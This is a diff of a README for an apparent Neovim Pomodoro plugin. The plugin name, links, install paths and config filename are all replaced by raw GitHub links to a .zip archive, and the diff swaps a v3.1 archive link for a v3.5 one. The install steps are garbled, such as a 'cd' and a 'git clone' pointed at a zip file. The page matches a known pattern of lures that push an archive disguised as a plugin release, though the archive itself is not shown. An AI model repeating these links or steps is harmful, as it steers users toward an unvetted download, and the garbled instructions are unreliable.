@@ -1,14 +1,14 @@
-# 🍅 https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip - Stay Focused with the Pomodoro Technique
+# 🍅 https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip - Stay Focused with the Pomodoro Technique
 
 ## 🚀 Getting Started
 
-Welcome to **https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip**, your solution to staying focused using the Pomodoro technique while working in Neovim. This plugin offers a minimal user interface, customizable sessions, and tracking features to enhance your productivity.
+Welcome to **https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip**, your solution to staying focused using the Pomodoro technique while working in Neovim. This plugin offers a minimal user interface, customizable sessions, and tracking features to enhance your productivity.
 
 ## 📥 Download & Install
 
-To get started, visit the following link to download the latest version of **https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip**:
+To get started, visit the following link to download the latest version of **https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip**:
 
-[![Download https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip)](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip)
+[![Download https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip)](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip)
 
 Once you are on the **Releases** page, you will find the latest version available for download. 
 
@@ -20,7 +20,7 @@ Once you are on the **Releases** page, you will find the latest version availabl
 
 ## 📂 Requirements
 
-Before installing **https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip**, ensure your system meets the following requirements:
+Before installing **https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip**, ensure your system meets the following requirements:
 
 - You need Neovim version 0.5 or higher.
 - Install Lua for enhanced performance and customization options.
@@ -33,17 +33,17 @@ After downloading the plugin, follow these steps to install it:
 1. Open your terminal.
 2. Navigate to your Neovim data directory by running:
    ```
-   cd ~https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip
+   cd ~https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip
    ```
 3. Clone the repository using the following command:
    ```
-   git clone https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip
+   git clone https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip
    ```
 
-You can also install **https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip** using a package manager. If you use [Packer](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip), add the following line to your `https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip`:
+You can also install **https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip** using a package manager. If you use [Packer](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip), add the following line to your `https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip`:
 
 ```lua
-use 'https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip'
+use 'https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip'
 ```
 
 4. Save the changes in your configuration file.
@@ -51,7 +51,7 @@ use 'https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodo
 
 ## 🎛 Configuration
 
-After installation, you can customize **https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip** to fit your workflow. Here is an example configuration:
+After installation, you can customize **https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip** to fit your workflow. Here is an example configuration:
 
 ```lua
 require('pomodoro').setup {
@@ -77,7 +77,7 @@ You can track how many sessions you have completed through the status line, help
 
 ## 📝 Features
 
-**https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip** offers several features to enhance your workflow:
+**https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip** offers several features to enhance your workflow:
 
 - **Custom Sessions:** Tailor session lengths to fit your needs.
 - **Tracking:** Keep a record of completed work sessions.
@@ -86,7 +86,7 @@ You can track how many sessions you have completed through the status line, help
 
 ## 📖 Additional Documentation
 
-For more detailed information about configurations, commands, and advanced features, please refer to the [Documentation](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip).
+For more detailed information about configurations, commands, and advanced features, please refer to the [Documentation](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip).
 
 ## 🛠 Troubleshooting
 
@@ -96,14 +96,14 @@ If you experience any issues, consider the following steps:
 2. Check for correct installation paths.
 3. Review your configuration settings for any errors.
 
-You can also find solutions to common problems on the [Issues](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip) page.
+You can also find solutions to common problems on the [Issues](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip) page.
 
 ## 🎉 Join the Community
 
-Feel free to share your experience with **https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip**. Join discussions on the GitHub page or post your suggestions on the issues section. Your input helps us improve the plugin.
+Feel free to share your experience with **https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip**. Join discussions on the GitHub page or post your suggestions on the issues section. Your input helps us improve the plugin.
 
 Remember to visit the **Releases** page again for updates:
 
-[![Download https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip)](https://raw.githubusercontent.com/newbieyan13/pomodoro.nvim/main/lua/pomodoro-nvim-v3.1.zip)
+[![Download https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip)](https://github.com/newbieyan13/pomodoro.nvim/raw/refs/heads/main/lua/pomodoro/pomodoro_nvim_v3.5.zip)
 
 Stay focused and productive!
